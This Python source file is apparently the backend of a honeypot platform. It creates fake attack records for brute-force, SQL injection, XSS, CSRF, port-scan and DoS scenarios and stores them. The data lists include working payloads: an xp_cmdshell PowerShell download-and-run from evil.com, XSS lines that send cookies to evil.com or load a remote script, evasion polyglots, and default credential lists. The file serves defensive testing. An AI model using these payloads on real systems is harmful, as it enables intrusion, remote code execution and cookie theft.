# app/simulation_api.py
from fastapi import APIRouter, Body, HTTPException
from typing import Dict, Any
import logging
import random
import uuid
from datetime import datetime

# Import database service
from .database import DatabaseService
from .models import Attack

# Setup logger
logger = logging.getLogger(__name__)

# Create router
router = APIRouter()

# Database service
db_service = DatabaseService()

@router.post("/attack-sim")
async def attack_sim(payload: Dict[str, Any] = Body(...)):
    """
    Simulate various types of attacks against a honeypot with different complexity levels
    """
    try:
        logger.info(f"Received attack simulation request: {payload}")
        
        # Extract honeypot_id
        honeypot_id = payload.get("honeypot_id")
        if not honeypot_id:
            return {"success": False, "error": "Missing honeypot_id"}
        
        # Check if honeypot exists
        honeypot = db_service.get_honeypot(honeypot_id)
        if not honeypot:
            return {"success": False, "error": f"Honeypot not found: {honeypot_id}"}
        
        # Get attack type and complexity
        attack_type = payload.get("attack_type", "login_attempt")
        complexity = payload.get("complexity", "basic")
        
        # Create attack ID and timestamp
        attack_id = str(uuid.uuid4())
        timestamp = datetime.now()
        
        # Generate source IP - more targeted or specific based on complexity
        source_ip = generate_source_ip(complexity)
        
        # Default fields
        username = None
        password = None
        details = {"simulated": True, "complexity": complexity}
        
        # Generate attack data based on type and complexity
        if attack_type == "login_attempt":
            # SSH brute force with increasing complexity
            username_pools = {
                "basic": ["admin", "root", "user", "guest", "test"],
                "moderate": ["admin", "root", "user", "guest", "test", "oracle", "support", "mysql"],
                "advanced": ["admin", "root", "jenkins", "tomcat", "postgres", "ubuntu", "azureuser", 
                            "ec2-user", honeypot.name.lower(), honeypot.type.lower()]
            }
            
            password_pools = {
                "basic": ["password", "123456", "admin", "root", "qwerty"],
                "moderate": ["password", "123456", "qwerty", "welcome", "P@ssword1", "admin123"],
                "advanced": ["P@ssw0rd!", "Adm1n@123", "r00tme", "Welcome2022!", 
                            f"{honeypot.name.lower()}123", f"{honeypot.type.lower()}@{random.randint(1000, 9999)}"]
            }
            
            # Select credentials based on complexity
            usernames = username_pools.get(complexity, username_pools["basic"])
            passwords = password_pools.get(complexity, password_pools["basic"])
            
            username = random.choice(usernames)
            password = random.choice(passwords)
            
            # More sophisticated attacks at higher complexity
            if complexity == "advanced":
                # Advanced attacks might try combinations of username+password
                if random.random() < 0.3:
                    username = honeypot.name.lower()
                    password = f"{username}123"
            
            details["raw_log"] = f"{timestamp.isoformat()} [HoneyPotSSHTransport,0,{source_ip}] login attempt [b'{username}'/b'{password}'] failed"
            details["login_method"] = "ssh"
            details["attempts"] = 1 if complexity == "basic" else random.randint(2, 10)
            
        elif attack_type == "sql_injection":
            # SQL injection with increasing sophistication
            basic_payloads = ["' OR 1=1 --", "admin' --", "' OR '1'='1", "1; DROP TABLE users"]
            
            moderate_payloads = [
                "' UNION SELECT username, password FROM users --",
                "'; INSERT INTO users VALUES ('hacker', 'password') --",
                "' OR username LIKE '%admin%",
                "admin'; UPDATE users SET password='hacked' WHERE username='admin' --"
            ]
            
            advanced_payloads = [
                "' OR IF(SUBSTR(username,1,1)='a',SLEEP(5),0) FROM users --",
                "'; EXEC xp_cmdshell('powershell -c \"IEX (New-Object Net.WebClient).DownloadString(''http://evil.com/script.ps1'')'') --",
                "' UNION ALL SELECT CONCAT(table_name,'.',column_name) FROM information_schema.columns --",
                (f"'; WITH cte AS (SELECT TOP 1 username,password FROM users) "
                 f"UPDATE u SET u.password='pwned' FROM users u JOIN cte ON u.username=cte.username --")
            ]
            
            # Select payload based on complexity
            if complexity == "basic":
                details["payload"] = random.choice(basic_payloads)
            elif complexity == "moderate":
                details["payload"] = random.choice(moderate_payloads)
            else:
                details["payload"] = random.choice(advanced_payloads)
            
            # Add more information for more complex attacks
            details["target_url"] = f"http://{honeypot.ip_address}:{honeypot.port}/login"
            details["raw_log"] = f"{timestamp.isoformat()} [HoneyPotWeb,0,{source_ip}] SQL injection attempt: {details['payload']}"
            
            if complexity != "basic":
                details["http_method"] = "POST"
                details["form_fields"] = {"username": "' OR 1=1 --", "password": "anything"}
                
            if complexity == "advanced":
                details["headers"] = {
                    "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
                    "Referer": "https://legitsite.com/login",
                    "X-Forwarded-For": generate_source_ip("basic")
                }
                details["evasion_techniques"] = ["encoding", "comment injection", "multi-line"]
                
        elif attack_type == "xss":
            # XSS with increasing obfuscation
            basic_payloads = [
                "<script>alert('XSS')</script>",
                "<img src='x' onerror='alert(1)'>",
                "<body onload='alert(\"XSS\")'>",
            ]
            
            moderate_payloads = [
                "<script>fetch('https://evil.com/?cookie='+document.cookie)</script>",
                "<img src=x onerror=\"eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))\">",
                "<div onmouseover=\"location='javascript:alert(1)'\" style=\"position:fixed;left:0;top:0;width:100%;height:100%\">Move mouse</div>",
            ]
            
            advanced_payloads = [
                "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
                "<img src=x onerror=\"(()=>{var s=document.createElement('script');s.src='https://evil.com/steal.js';document.body.appendChild(s)})();\">",
                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
            ]
            
            # Select payload based on complexity
            if complexity == "basic":
                details["payload"] = random.choice(basic_payloads)
            elif complexity == "moderate":
                details["payload"] = random.choice(moderate_payloads)
            else:
                details["payload"] = random.choice(advanced_payloads)
                
            details["target_field"] = random.choice(["comment", "search", "name", "email", "message"])
            details["raw_log"] = f"{timestamp.isoformat()} [HoneyPotWeb,0,{source_ip}] XSS attempt: {details['payload']}"
            
            # Add more context for higher complexity
            if complexity != "basic":
                details["insertion_point"] = random.choice(["body", "url", "form", "cookie"])
                details["context"] = random.choice(["html", "attribute", "javascript", "css"])
                
            if complexity == "advanced":
                details["evasion"] = ["encoding", "splitting", "obfuscation"]
                details["exploit_type"] = random.choice(["stored", "reflected", "DOM-based"])
                details["target_browsers"] = random.sample(["Chrome", "Firefox", "Safari", "Edge"], 2)
        
        elif attack_type == "csrf":
            # CSRF with increasing sophistication
            target_actions = ["change_password", "transfer_funds", "update_profile"]
            
            # Generate more complex CSRF based on complexity
            details["target_action"] = random.choice(target_actions)
            details["raw_log"] = f"{timestamp.isoformat()} [HoneyPotWeb,0,{source_ip}] CSRF attempt on {details['target_action']}"
            
            # Basic CSRF just has simple form submission
            details["method"] = "POST"
            details["forged_request"] = True
            
            # More complex CSRF for moderate/advanced
            if complexity != "basic":
                details["target_url"] = f"http://{honeypot.ip_address}:{honeypot.port}/account/{details['target_action']}"
                details["referrer_spoofing"] = True
                details["payload_delivery"] = random.choice(["img", "iframe", "form", "xhr"])
                
            if complexity == "advanced":
                details["token_handling"] = random.choice(["token_theft", "same-site", "replay"])
                details["anti_csrf_bypass"] = random.choice(["timing", "referrer_check", "origin_manipulation"])
                details["chained_vulnerabilities"] = random.choice(["XSS+CSRF", "open_redirect+CSRF", None])
                details["headers"] = {
                    "Origin": f"http://{honeypot.ip_address}:{honeypot.port}",
                    "Referer": f"http://{honeypot.ip_address}:{honeypot.port}/account",
                    "Cookie": "session=forged-session-id"
                }
        
        elif attack_type == "port_scan":
            # Port scanning with increasing sophistication
            # Basic port scan hits common ports
            basic_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389]
            moderate_ports = list(range(1, 1024)) + [1433, 1521, 3306, 5432, 5900, 8080, 8443]
            advanced_ports = moderate_ports + list(range(8000, 8100)) + list(range(10000, 10100))
            
            # Number of ports increases with complexity
            if complexity == "basic":
                scan_ports = random.sample(basic_ports, min(5, len(basic_ports)))
                scan_rate = random.randint(10, 20)  # Scans per second
            elif complexity == "moderate":
                scan_ports = random.sample(moderate_ports, min(20, len(moderate_ports)))
                scan_rate = random.randint(50, 200)  # Faster scan
            else:
                # Advanced scans might target specific services or be smarter
                scan_ports = random.sample(advanced_ports, min(50, len(advanced_ports)))
                scan_rate = random.randint(5, 15)  # Slower to avoid detection
            
            details["scanned_ports"] = scan_ports
            details["scan_rate"] = scan_rate  # Ports per second
            
            scan_types = {
                "basic": ["SYN", "TCP Connect"],
                "moderate": ["SYN", "TCP Connect", "FIN", "NULL", "XMAS"],
                "advanced": ["SYN", "ACK", "FIN", "NULL", "XMAS", "Window", "Maimon"]
            }
            
            # Select scan type based on complexity
            scan_type_options = scan_types.get(complexity, scan_types["basic"])
            details["scan_type"] = random.choice(scan_type_options)
            details["raw_log"] = f"{timestamp.isoformat()} [HoneyPotNetworking,0,{source_ip}] {details['scan_type']} scan targeting ports {scan_ports[:5]}..."
            
            # Advanced scans have more stealth and evasion techniques
            if complexity == "advanced":
                details["evasion_techniques"] = random.sample([
                    "fragmentation", "timing", "decoys", "source_port_manipulation", 
                    "IP_spoofing", "FTP_bounce"
                ], 2)
                details["scan_pattern"] = random.choice(["incremental", "random", "pattern-based"])
        
        elif attack_type == "dos":
            # DoS attack with increasing volume and sophistication
            if complexity == "basic":
                details["request_count"] = random.randint(500, 2000)
                details["request_rate"] = random.randint(50, 200)
                details["target_resource"] = "/login"
            elif complexity == "moderate":
                details["request_count"] = random.randint(2000, 10000)
                details["request_rate"] = random.randint(200, 500)
                details["target_resource"] = f"/{random.choice(['search', 'products', 'api/data', 'login'])}"
                details["attack_type"] = random.choice(["HTTP Flood", "SYN Flood", "UDP Flood"])
            else:
                details["request_count"] = random.randint(10000, 50000)
                details["request_rate"] = random.randint(500, 2000)
                details["target_resource"] = f"/{random.choice(['api/v2/user', 'search?q=' + 'A'*1000, 'admin/auth'])}"
                details["attack_type"] = random.choice(["Slowloris", "HTTP POST Flood", "SSL Exhaustion", "ReDoS"])
                details["distributed"] = True
                details["source_ips"] = [generate_source_ip("basic") for _ in range(random.randint(5, 20))]
                
            details["raw_log"] = f"{timestamp.isoformat()} [HoneyPotDDoS,0,{source_ip}] DoS attempt: {details['request_count']} requests at {details['request_rate']}/sec to {details['target_resource']}"
        
        # Create attack data object
        attack_data = {
            "id": attack_id,
            "honeypot_id": honeypot_id,
            "timestamp": timestamp,
            "source_ip": source_ip,
            "attack_type": attack_type,
            "username": username,
            "password": password,
            "details": details
        }
        
        # Add hash
        attack_hash = db_service._get_attack_hash(attack_data)
        attack_data["attack_hash"] = attack_hash
        
        # Create attack object
        attack = Attack.parse_obj(attack_data)
        
        # Check if attack exists
        if db_service.attack_exists(attack_data):
            logger.info(f"Attack with hash {attack_hash} already exists")
            return {"success": False, "message": "Attack already exists"}
        
        # Save attack
        result = db_service.save_attack(attack)
        if result:
            logger.info(f"Successfully saved attack: {attack_id}")
            return {"success": True, "attack_id": attack_id}
        
        return {"success": False, "error": "Failed to save attack"}
        
    except Exception as e:
        logger.exception(f"Error in attack simulation: {str(e)}")
        return {"success": False, "error": f"Server error: {str(e)}"}

def generate_source_ip(complexity: str) -> str:
    """Generate source IP addresses based on complexity"""
    
    # Basic complexity: completely random IPs
    if complexity == "basic":
        return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    
    # Moderate complexity: IPs from common attack sources
    elif complexity == "moderate":
        # Use ranges commonly associated with attacks
        common_blocks = [
            (194, 195), (45, 50), (89, 94), (103, 106), 
            (176, 180), (213, 220), (125, 130), (91, 95)
        ]
        block = random.choice(common_blocks)
        return f"{random.randint(block[0], block[1])}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    
    # Advanced complexity: Targeted or APT-style attack sources
    else:
        # Use specific country-based IP blocks or APT-associated ranges
        apt_blocks = [
            # Sophisticated attacker ranges (examples only)
            (58, 59), (95, 95), (185, 186), (217, 217),
            (45, 46), (194, 194), (62, 62), (176, 176)
        ]
        block = random.choice(apt_blocks)
        # For advanced attacks, sometimes use a seemingly legitimate IP
        if random.random() < 0.3:
            # Mimic CDN or trusted services
            trusted_blocks = [(13, 13), (34, 34), (104, 104), (172, 172), (8, 8)]
            block = random.choice(trusted_blocks)
        
        return f"{block[0]}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"